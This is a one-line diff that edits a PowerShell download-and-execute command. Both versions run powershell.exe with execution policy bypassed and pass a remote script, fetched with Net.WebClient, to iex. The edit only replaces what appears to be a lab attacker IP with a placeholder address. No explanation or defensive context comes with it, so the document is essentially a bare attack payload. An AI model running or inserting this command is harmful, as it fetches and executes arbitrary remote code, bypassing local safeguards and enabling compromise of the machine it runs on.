@@ -1,1 +1,1 @@
-powershell.exe -NoP -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.19/a.ps1'))"
+powershell.exe -NoP -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('http://XX.XX.XX.XX/a.ps1'))"
